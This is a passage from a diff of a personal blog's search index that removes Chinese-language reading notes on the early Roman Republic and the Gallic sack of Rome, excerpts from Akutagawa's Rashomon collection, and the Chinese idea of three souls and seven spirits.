-<p>​	<u>历时240多年的罗马王政时代结束（753-509BC），从此开始了罗马共和国时代</u>。</p>
-<ul>
-<li>
-<p>相关阅读：莎士比亚《鲁克丽丝受辱记》</p>
-<ul>
-<li>
-<p>原文！写的真入微</p>
-</li>
-<li>
-<p><a href="https://www.diyifanwen.com/sicijianshang/mingjiaaiqingshi/221844869_7.html">莎士比亚诗选-鲁克丽丝受辱记 (diyifanwen.com)</a></p>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
-<p>当时看完这p去搜了莎士比亚写的这首诗。看完……还没看完，就觉得好长、好长啊……当然莎士比亚这个文笔也真的是山路十八弯九曲回肠的非常婉转诗意啊</p>
-]]></content>
-      <categories>
-        <category>文史哲</category>
-        <category>世界史</category>
-        <category>罗马史</category>
-      </categories>
-      <tags>
-        <tag>reading</tag>
-        <tag>世界史</tag>
-        <tag>罗马史</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《罗生门》读书摘记</title>
-    <url>/2024/07/04/reading/%E5%A4%96%E5%9B%BD%E6%96%87%E5%AD%A6/%E6%97%A5%E6%9C%AC%E6%96%87%E5%AD%A6/%E3%80%8A%E7%BD%97%E7%94%9F%E9%97%A8%E3%80%8B%E8%AF%BB%E4%B9%A6%E6%91%98%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
-<p>这本书好像是芥川龙之介的作品集，只是以最出门的《罗生门》命名，其中包含了《罗生门》《鼻》《手帕》《地狱变》《蛛丝》《橘》《舞会》《密林中》《矿车》《阿富的贞操》《一篇爱情小说》《单相思》《侏儒警语》等文章。</p>
-<p>目前看到的部分是《地狱变》 读起来感觉是跟《罗生门》一样印象深刻的作品。</p>
-<p>本文是以上作品的一些句子摘录以及一些可能对自分の文学创作（？有益的批注</p>
-<h3 id="摘录始于此"><a class="header-anchor" href="#摘录始于此">¶</a>摘录始于此</h3>
-<h4 id="译本序"><a class="header-anchor" href="#译本序">¶</a>译本序</h4>
-<p>书山稗（bai四）海，文史苑囿（you四），于中沉潜含玩，钩沉抉隐，一旦发而为文，自是信手拈来。随机生发，纵横捭（bai三）阖，不可抑勒。从王侯衙役到市井小民，从寺院高僧到天主教徒，从紫宸之深到江湖之远，在其笔下无不呼之即来，腾跃纸上。</p>
-<ul>
-<li>
-<p>钩沉抉隐：“钩沉”与“抉隐”意思相近，都有“探索深奥的道理或散失的内容”的意思</p>
-</li>
-<li>
-<p>沉潜：①在水里潜伏、沉没。②思想感情深沉，不外露。③集中精神；潜心</p>
-</li>
-</ul>
-<p>值得注意的是，芥川的历史题材小说并非为了演绎历史典故和翻拍历史人物，而是身披历史戏装的“现代小说”，目的在于借古喻今，针砭时弊，臧否人物，传达现代人的生命窘态和灵魂质地。……原典出入自如，布局浑然天成，主题独出机杼，笔致摇曳生姿。</p>
-<ul>
-<li>臧否：①褒贬，评论   ②善恶</li>
-</ul>
-<p>芥川生性敏感，纵然一件司空见惯的小事，也往往使其脆弱的神经震颤良久。一般来说，他不重描绘而意在发觉，疏于叙述而工于点化。少的是轻灵与潇洒，多的是沉郁与悲凉。</p>
-<p>无论得于史料之作，还是拾于现实之篇，其一以贯之者，大约是以下两条主线。一是对人性中“恶”的暴露、揶揄和鞭挞。第二条主线便是对人对人生的幻灭感亦即厌世主义倾向所导致的对艺术的执着与痴迷，这或许也是出于对前者的一种补偿心理。</p>
-<p>尤为可贵的是，“他有意识地创造了文体——不是陈陈相因（的文体，而是一扫庸俗气味的艺术文体”（中村真一郎语），堪称典型的艺术至上者。</p>
-<ul>
-<li>陈陈相因：粮仓里的米谷一年接一年地堆积起来。比喻沿袭老一套，没有改进。</li>
-</ul>
-<p>可以说，对中国古典的向往和对中国现实的鄙视是芥川“中国认识”的一对矛盾。前者使之怀有文化上的自卑，后者催生其现实中的傲慢（“日本优越论”）。这其实也是日本近现代主流知识分子或精英阶层共同的基本倾向，纵令夏目漱石亦不例外。愈到后来，自卑愈见其轻而傲慢愈见其烈，在结果上成为日本对外扩张和侵华战争所以顺利推进的重要思想舆论资源和社会基础。</p>
-<ul>
-<li>
-<p>纵令：即使——用在偏正复句的偏句，表示假设的让步，即退一步提出某种情况。  例句：纵令失败，我们也要继续实验。</p>
-</li>
-<li>
-<p>黄钟大吕：形容音乐或言辞庄严、正大、高妙、和谐。  例句：①这首乐曲饱含一种黄钟大吕的气势。  ②他的这篇短文十分朴素，却如黄钟大吕，震撼人心。  ③堪称黄钟大吕的鸿篇巨制</p>
-</li>
-</ul>
-<h4 id="鼻"><a class="header-anchor" href="#鼻">¶</a>鼻</h4>
-<p>人的内心存在两种相互矛盾的情感。无疑，没有人不同情他人的不幸。可是，一旦对方好歹从不幸中挣扎出来，却又因此产生若有所失的怅惘。说得夸张一点，甚至出现一种想使之重新陷入不幸的心理。于是，不觉之间开始对其怀有某种敌意，尽管是消极的敌意。不知个中缘由的内供之所以怏怏不快，无非是因为他从池尾僧俗的态度中，隐隐觉察出了这些旁观者的利己主义。</p>
-<h4 id="地狱变"><a class="header-anchor" href="#地狱变">¶</a>地狱变</h4>
-<p>这是因为，良秀笔下的众多罪人，上至三公九卿下至乞丐贱民，网罗了各色人等。有峨冠博带的庙堂高官，有花枝招展的年轻宫女，有颈挂麻纸的诵经僧，有高底木屐的书童，有长裙飘飘的豆蔻侍女，有手持供钱的阴阳先生，无暇一一列举。总之，如此形形色色的诸多男女，无不惨遭牛头马面的摧残，在上下翻腾的浓烟烈火中如风吹败叶般四下狼狈逃窜。</p>
-<p>那被烟呛得白惨惨的面庞，那随火乱舞的长飘飘的秀发，那转瞬化为火焰的美艳艳的樱花盛装——所有这些是何等惨不忍睹啊！尤其每当夜风向下盘旋而烟随风披靡之时，金星乱坠的红通通的火焰中便闪现出少女咬着堵嘴物而始终拼命挣脱锁链时那痛苦扭动的情形，令人觉得地狱的大苦大难活生生展现于眼前。</p>
-<p>刚才还在为地狱的惨烈场面惊恐困惑的良秀，此刻那满是皱纹的脸上浮现出无可名状的光辉——一种近乎恍惚状态的由衷喜悦之情。</p>
-]]></content>
-      <categories>
-        <category>文史哲</category>
-        <category>外国文学</category>
-        <category>日本文学</category>
-      </categories>
-      <tags>
-        <tag>reading</tag>
-        <tag>外国文学</tag>
-        <tag>日本文学</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【从城邦到帝国】2_北蛮入侵_罗马危机</title>
-    <url>/2024/07/06/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%E3%80%90%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%E3%80%912_%E5%8C%97%E8%9B%AE%E5%85%A5%E4%BE%B5_%E7%BD%97%E9%A9%AC%E5%8D%B1%E6%9C%BA/</url>
-    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
-<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>   是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
-<h3 id="北蛮入侵-罗马危机"><a class="header-anchor" href="#北蛮入侵-罗马危机">¶</a>北蛮入侵 罗马危机</h3>
-<p>公元前509年，罗马人在布鲁图斯和克拉第努斯的带领下推翻国王，以此为起点，直到公元前27年，元老院授予<strong>屋大维</strong>“奥古都斯”称号为止的这四百八十二年间，称<u>罗马共和国</u>。</p>
-<p><u>两条主线</u></p>
-<p><em><strong>一  平民与贵族的斗争  使罗马的各项制度趋于完善</strong></em></p>
-<p><em><strong>二  大规模的对外扩张  使罗马确立地中海霸权</strong></em></p>
-<p>自从布鲁图斯和克拉第努斯推翻王政后，元老院同意从贵族中推选两名<strong>执政官</strong>，以代替原来的国王治理国家。</p>
-<p>这两人权力相等，彼此制衡，且执政官的任期只有一年，卸任后自然回归元老院，国家将再度选举新执政官（老执政官依然可能再度当选）。</p>
-<p>当国家处于战争等非常时期，为了确保权力集中，以处理国是，将由元老院推举<strong>独裁官</strong>。</p>
-<p>这个独裁官可能是执政官，也可能是其他元老中的某一位。</p>
-<p>罗马共和国为了避免独裁官权力过于膨胀，又规定独裁官只能任职六个月。如果任期将满，而国家仍处于非常时期，则由元老院再行选举，老独裁官也可能会连任。</p>
-<p>此外罗马还完善其他官制，比如<strong>保民官</strong>、<strong>市政官</strong>之类。</p>
-<p>共和之初的罗马强邻环伺，只是亚平宁半岛上众多国家或部落中的一个小国。</p>
-<p>在她的背面是意大利最强大的埃特鲁里亚人，南面是沃尔西人、萨莫奈人、希腊人等，生存环境十分恶劣。</p>
-<p>共和国最初的一百多年，罗马人就是在不断的和近邻的战斗中度过的。</p>
-<p>公元前五世纪下半叶，罗马人在与沃尔西人的较量中转入优势。与此同时，罗马人与埃特鲁里亚人之间也爆发战争。</p>
-<p>距离罗马城东北方向十二英里处有一座埃特鲁里亚人的重镇<em>维爱城</em>。早在王政时期，双方就因为水源、土地、盐、奴隶等各种原因经常打仗。</p>
-<p>公元前479年，罗马对<em>维爱战争</em>中失利；公元前430年，罗马人扳回一局；</p>
-<p>公元前405年，罗马再次进军，意图吞并维爱（Veii）。而这次出兵先后持续了10年。直到公元前396年，罗马执政官<strong>卡米卢斯</strong>（Camillus）夺取城池。</p>
-<p>经过三次<u>维爱战争</u>，罗马的<em>埃特鲁里亚之患</em>从此消失，其势力也从拉丁平原扩张到意大利北部。</p>
-<p>这场战争也是<u>罗马开始对外征服的标志</u>。</p>
-<p>罗马在被征服的城市建立殖民地，和被征服者订立盟约，并排遣自己人去监督和统治这些地方，进而形成了自治、半自治或同盟关系。</p>
-<p>公元前391年，一支<em>高卢</em>人部落（赛农人Senone）在布伦努斯的率领下从北意大利沿着亚德里亚海岸一路摧枯拉朽，十分骁勇。</p>
-<p>攻打至埃特鲁里亚的克鲁西姆城时（今：Chiusi），克鲁希姆告急，向罗马求援。</p>
-<p>罗马元老院向这支高卢人部落派遣了三个使臣，勒令停战，结果在谈判席上，双方进行了一波不太友好的交谈，两方人打了起来。</p>
-<p>期间，罗马使者还杀了一个高卢的小头目。遭受奇耻大辱的高卢人在几天后便排遣大军杀向罗马</p>
-<p>公元前390年，两军在距离罗马城北16公里外的阿里亚小河交战（Battle of the Allia）。</p>
-<p>高卢人突然兵临城下，令罗马人十分惊讶，以至于罗马军几乎没有时间搭建营地和防御工事就匆匆投入战场。</p>
-<p>为了避免被全歼，罗马军将战线拉长，并分兵排遣一支部队驻扎在军阵右侧的小山上。</p>
-<p>高卢首领布伦努斯察觉到罗马人的动向，他担心一旦两军交战，罗马的右翼会从己方军阵的后方发起袭击，届时恐于己不利，于是他直接命令手下向罗马军右翼率先发起进攻。</p>
-<p>罗马军左翼部队紧急向右军靠拢，而高卢军早已杀入军阵，拦住左翼去路，双方陷入混战。</p>
-<p>可能是因为高卢人的剑比罗马人的长，使得战斗中的罗马人全线劣势，军心大乱。渐渐的越来越多的人在恐慌之中四处逃窜，左翼撤往维爱，右翼撤往罗马。</p>
-<p>而高卢人对于这场轻而易举取得的胜利感到十分震惊。处理完战场后，他们集结军队继续向罗马城进发。</p>
-<p>此时，罗马败退的军队大多数已经逃往维爱，少部分逃到罗马，而那些逃到罗马的人认为自己力量弱小，根本不是高卢人的对手，固守城池等于必死无疑。</p>
-<p>于是，他们中的青壮年带着给养退守卡皮托尔山，只留下了少数妇孺老人（包括一些元老）在城市中。</p>
-<p>当高卢大军抵达罗马城下时，发现城门大开，无人看守，顿时就起了疑心。</p>
-<p>为了避免意外，高卢军很小心的在罗马与阿尼奥河之间扎营（今：Aniene River）。第二题，高卢人留下小队留守城门，剩下的大部队入城劫掠。他们进了城，发现街道上有一些路障，贵族的议事厅大门也是敞开的，城里异常的安静。就在他们以为这是个空城的时候，一个高卢人注意到几位衣着华丽的老者坐在不远处的走廊台阶上。他们面无表情，似乎内心毫无波澜。</p>
-<p>高卢人走上去，仔细端详这几位一反常态的老者，并好奇地伸手去摸了摸其中一位老者长长的胡子。这时，老人举起手中的象牙拐杖，敲了下那个高卢人的头。而高卢人反手一刀索了他的命，余者亦无一幸免。</p>
-<p>为了让那些逃至山中的罗马人回城救援他们的财物和亲人，高卢人放火烧城并大肆劫掠。</p>
-<p>高卢军见罗马人没能中计，主动冲山。罗马军以逸待劳，加之居高临下，拼死抵抗，化解了高卢人的数次进攻。</p>
-<p>高卢人见攻山不利，于是在山脚下布阵，将山上的罗马人全部包围。</p>
-<p>此前逃到维爱城的罗马军也重新集结起来，他们将维爱城中的埃特鲁里亚奴隶充军，加上拉丁同盟的支持，军队恢复些许元气。随后在元老院的批准下，将此前被驱逐的前执政官<strong>卡米卢斯</strong>召回并任命为<strong>独裁官</strong>。卡米卢斯带领军队向罗马进发。</p>
-<p>在卡皮托尔山下，高卢人打探到一条上山小道，于是高卢军悄悄上山意图偷袭罗马人。眼看着就要接近罗马营地时，一只**<u>大鹅</u>**突然嘎嘎大叫，罗马人惊醒，将高卢人击退。随后的日子里，双方一直僵持不下。</p>
-<p>高卢军营内出现疟疾，不少士兵倒下。高卢人派使者找罗马人谈判，但罗马指挥官得知援军正在赶来的路上，于是拒绝，但士兵挨饿。随后双方经过谈判，罗马同意支付一千磅黄金。</p>
-<p>在交付的时候，高卢人故意用一个不准的秤去称黄金，罗马人十分恼怒上前交涉。这时，高卢首领布伦努斯将剑丢到了秤的另一头。罗马人迫于形势，也只好忍着屈辱去搬更多的黄金放在秤上。</p>
-<p>就在这个添黄金的关头，维爱的援军在卡米卢斯的率领下终于赶到罗马。双方无法谈拢，只能再次开战（BC 390-BC 387），此次交战，罗马取得大胜，高卢军惨败而逃。</p>
-<p>这段故事由<strong>李维</strong>（Titus Livius）记载。其他史书还有不同记载，比如高卢人向罗马人勒索赎金之后便撤军走了。由于年代久远，历史学家对这些记载的真实性持不同观点。</p>
-]]></content>
-      <categories>
-        <category>文史哲</category>
-        <category>世界史</category>
-        <category>罗马史</category>
-      </categories>
-      <tags>
-        <tag>reading</tag>
-        <tag>世界史</tag>
-        <tag>罗马史</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【中国神话-冥界篇】1_三魂七魄</title>
-    <url>/2024/07/07/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%AD%E5%9B%BD%E5%8F%B2/%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D/%E5%86%A5%E7%95%8C%E7%AF%87/%5B%E4%B8%AD%E5%9B%BD%E7%A5%9E%E8%AF%9D-%E5%86%A5%E7%95%8C%E7%AF%87%5D-1-%E4%B8%89%E9%AD%82%E4%B8%83%E9%AD%84/</url>
-    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
-<p>[视频地址](<a href="https://www.bilibili.com/video/BV1yA411V7ko/?spm_id_from=333.337.search-card.all.click&amp;vd_source=3f0983ef34615b702fec513c41e55a64">[中国神话-冥界篇 合集]中国古代魂魄观念大盘点！让你理清中国人的灵魂观！_哔哩哔哩_bilibili</a>)    感觉自分乃亚文化爱好者HHH</p>
-<h3 id="冥界篇-1"><a class="header-anchor" href="#冥界篇-1">¶</a>冥界篇 1</h3>
-<ul>
-<li>
-<p>由于中国人喜欢记录历史，神话人物大部分以历史人物为雏形衍生的，例如三皇五帝就是以部落或者部落首领的名字来创作的神话。</p>
-</li>
-<li>
-<p>中华民族还有着楚国屈原记录的《九歌》神话。</p>
-<ul>
-<li>
-<p>在九歌之中，东皇太一是至高主神；</p>
-</li>
-<li>
-<p>而在《山海经》中，则以女娲、帝俊为主神；</p>
-</li>
-<li>
-<p>盘古开天的神话却要直到三国时期由徐整所著的《三五历纪》中才出现，比在战国时期的《山海经》雏形要晚了几百年。</p>
-</li>
-</ul>
-</li>
-<li>
-<p>十几代人的时间差使得中国神话主神与诸神的关系模糊不清，再加上道教、佛教、儒家思想对于神话的梳理与编纂，中国神话的主要脉络很难梳理。</p>
-</li>
-<li></li>
-<li>
-<p>传说商朝人好鬼神，每逢有战事或国家大事，帝王都会去往祖陵或祭台由祭司进行占卜。最为主流的占卜是将龟甲打磨抛光之后，由祭司投入紫荆木点燃的火焰之中，以龟甲之上的裂痕来判断吉凶，并以吉凶来判断接下来人们该怎样行事。这里的占卜出的结果，就是上天和鬼神们所给人的答案。</p>
-</li>
-<li>
-<p>“社稷大事，唯祀与戎”</p>
-</li>
-<li>
-<p>但随着时间的流逝，这一类的占卜之术逐渐的失传，变为了其他形式。</p>
-</li>
-<li>
-<p>到了汉朝时，帝王独尊儒术，圣人孔子不说鬼神。此时，对于鬼神的解释之权落到了道家的手中。道家以老子学说，结合阴阳五行，乾坤八卦思想，再加上古人对于天地自然的观测与想象，这才衍生出了三魂七魄的观念。</p>
-</li>
-<li>
-<p>这个观念之所以能保留下来，也是因为皇权与儒家选择的结果。中国人敬拜祖先，因此还有了清明节和中元节这一类祭奠逝者的节日。</p>
-</li>
-<li>
-<p>在三魂七魄的观念未出现之前，不说鬼神的儒家一直无法解释大家到底在祭拜什么。直到三魂七魄观念的出现，才打破这一僵局。</p>
-</li>
-<li></li>
-<li></li>
-<li>
-<p>三魂，分别是天魂胎光、地魂爽灵、人魂幽精。</p>
-</li>
-<li>
-<p>传说在人没有出生之前，人魂由神明专司保管。当人体形成，人魂就会进入到肉体之中，此时，天地阴阳之精气也会形成人的魂魄，从而辅助人魂的成长。随着人本身的成长，天地人三魂也会有着同样的记忆、行为与性格。</p>
-</li>
-<li></li>
-<li>
-<p>一个传说之中的故事：明太祖朱元璋有一次被一个冒失的太监吓了一跳，于是命人将太监拖出去斩首，当时这个太监吓得面无血色。在斩首之时，人们惊讶的发现，斩首台之下竟然有一个长的和太监一模一样的人在那里看热闹。在太监被斩首的前一刻，朱元璋又下旨赦免了这个太监。也是这一吓，将太监的一个魂吓掉了，幻化出来另一个一模一样的自己并较有兴致的观看自己被斩首。</p>
-</li>
-<li>
-<p>而在人死后，天魂和地魂的精气会再度回归到天地之中。丧失本源精气的这两个魂，一个会守护在自己的尸身旁边，一个会去到子孙后代供奉的牌位之中，接受子孙的敬拜与祭祀，而人魂则会被专司灵魂的神明拘走，从而为自己生前的善果和恶行负责；依附在尸身与牌位旁的魂，会像是一个监视器一样在灵位与坟墓旁边观看子孙的言行，观察子孙是否遵纪守法，心向善而不作恶，并保佑这些子孙健康的成长</p>
-</li>
-<li>
-<p>这套说法之所以能够大面积地流行，很大原因取决于儒家接受了三魂这一设定，认为人每当清明节祭祀祖先的时候，都是在祭祀祖先肉体死亡后留下来的那个魂（此处可以指先祖的精神）</p>
-</li>
-<li>
-<p>但对于祖先的祭祀也有规矩：先祖们只能够接受自己直系血脉的祭祀。这个观点来自于古代人对血缘观念的认识。</p>
-</li>
-<li>
-<p>民间也有流传这样一个传说故事：据说一个地方的县太守手下有一个异人，这个人天生可以看到各家祖先的祭祀情况，县太守便命此人观察自家祭祀香火情况。当县太守的儿子为自家祖先上香之后，这个人却说他看到一个屠夫模样的魂进入到太守的祖庙大吃大喝，而旁边穿着官服的县太守本家的祖先，却饿的瘦骨嶙峋在家庙前徘徊。县太守于是逼问妻子，才得知当年生的是女儿，与屠夫家的女人换了孩子。</p>
-</li>
-<li>
-<p>由这个故事可见中国文化中对直系子孙的重视，因此还产生了“不孝有三，无后为大”的言论。虽然故事中由重男轻女的陈腐观念，但也可以从中看出鬼神文化对古人生活的影响。</p>
-</li>
-<li>
-<p>在<strong>道家</strong>系统中，三魂是阳之所属，相对应的七魄则是阴所在。七魄各自都有名称，分别是尸狗、伏矢、雀阴、吞贼、非毒、除秽、臭肺。七魄各自负责人们的喜、怒、哀、惧、爱、恶、欲七种主要的情绪。</p>
-</li>
-<li>
-<p>传说在平日里，都是由三魂来掌控七魄，致使七魄不敢为非作歹使人沉浸于情欲之中。但当三魂受到严重打击而衰弱之时，三魂无力掌控七魄，</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>文史哲</category>
-        <category>中国史</category>
-        <category>中国神话</category>
-        <category>冥界篇</category>
-      </categories>
-      <tags>
-        <tag>reading</tag>
-        <tag>世界史</tag>
-        <tag>中国神话</tag>
-        <tag>冥界篇</tag>
       </tags>
   </entry>
 </search>
